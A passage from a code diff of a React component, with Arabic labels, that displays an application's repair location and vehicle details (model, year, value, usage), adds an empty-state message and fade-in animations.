+                            {selectedApplication.repairLocation && (
+                              <div className="flex justify-between items-center py-2 transition-colors hover:bg-muted/30 px-2 rounded">
+                                <span className="text-sm text-muted-foreground">موقع الإصلاح</span>
+                                <span className="text-sm font-medium text-foreground">
+                                  {selectedApplication.repairLocation === "agency" ? "الوكالة" : "ورشة"}
+                                </span>
+                              </div>
+                            )}
+                          </div>
+                        </div>
+                      )}
+
+                      {/* 7. Vehicle Info */}
+                      {hasVehicleInfo(selectedApplication) && (
+                        <div
+                          className="bg-card rounded-xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
+                          style={{ animationDelay: "600ms" }}
+                        >
+                          <div className="flex items-center gap-3 mb-4">
+                            <div className="p-2 rounded-lg bg-chart-4/10">
+                              <Car className="w-4 h-4 text-chart-4" />
+                            </div>
+                            <h3 className="font-semibold text-foreground">معلومات المركبة</h3>
+                          </div>
+                          <div className="grid grid-cols-2 gap-4">
+                            {selectedApplication.vehicleModel && (
+                              <div className="p-3 bg-muted/30 rounded-lg border border-border/50 transition-all hover:border-chart-4/30 hover:bg-chart-4/5">
+                                <p className="text-xs text-muted-foreground mb-1">الموديل</p>
+                                <p className="text-sm font-medium text-foreground">
+                                  {selectedApplication.vehicleModel}
+                                </p>
+                              </div>
+                            )}
+                            {selectedApplication.manufacturingYear && (
+                              <div className="p-3 bg-muted/30 rounded-lg border border-border/50 transition-all hover:border-chart-4/30 hover:bg-chart-4/5">
+                                <p className="text-xs text-muted-foreground mb-1">سنة الصنع</p>
+                                <p className="text-sm font-medium text-foreground">
+                                  {selectedApplication.manufacturingYear}
+                                </p>
+                              </div>
+                            )}
+                            {selectedApplication.vehicleValue && (
+                              <div className="p-3 bg-muted/30 rounded-lg border border-border/50 transition-all hover:border-chart-4/30 hover:bg-chart-4/5">
+                                <p className="text-xs text-muted-foreground mb-1">القيمة</p>
+                                <p className="text-sm font-medium text-foreground">
+                                  {selectedApplication.vehicleValue} ريال
+                                </p>
+                              </div>
+                            )}
+                            {selectedApplication.vehicleUsage && (
+                              <div className="p-3 bg-muted/30 rounded-lg border border-border/50 transition-all hover:border-chart-4/30 hover:bg-chart-4/5">
+                                <p className="text-xs text-muted-foreground mb-1">الاستخدام</p>
+                                <p className="text-sm font-medium text-foreground">
+                                  {selectedApplication.vehicleUsage}
+                                </p>
+                              </div>
+                            )}
+                          </div>
+                        </div>
+                      )}
+                    </div>
+                  ) : (
+                    /* Empty state when no grid data exists */
+                    <div className="flex items-center justify-center h-full">
+                      <div className="text-center animate-in fade-in zoom-in duration-500">
+                        <div className="w-20 h-20 rounded-2xl bg-muted/50 flex items-center justify-center mx-auto mb-4">
+                          <FileText className="w-10 h-10 text-muted-foreground" />
+                        </div>
+                        <h3 className="text-lg font-semibold text-foreground mb-2">لا توجد بيانات</h3>
+                        <p className="text-sm text-muted-foreground">لم يتم إضافة أي معلومات لهذا الطلب بعد</p>
                       </div>
                     </div>
-                  </div>
+                  )}
                 </div>
               </div>
             )
           ) : (
             <div className="flex items-center justify-center h-full">
-              <div className="text-center">
+              <div className="text-center animate-in fade-in zoom-in duration-500">
                 <div className="w-20 h-20 rounded-2xl bg-muted flex items-center justify-center mx-auto mb-4">
                   <Mail className="w-10 h-10 text-muted-foreground" />
                 </div>
